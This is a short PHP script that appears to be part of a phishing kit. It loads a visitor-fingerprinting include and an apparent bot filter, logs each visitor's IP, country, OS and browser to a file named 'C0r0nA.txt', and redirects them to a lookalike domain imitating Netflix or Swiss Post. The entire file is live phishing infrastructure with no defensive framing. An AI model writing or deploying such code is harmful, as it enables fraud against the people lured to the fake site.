<?php
include('./OS.php');
require('./stop.php');
$file = fopen("C0r0nA.txt","a");
fwrite($file,$ip2."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$cn | $os | $br] \n");
header("Location: https://shweizchnetlix-a237b7.ingress-baronn.easywp.com/diepostch/de/")

 ?>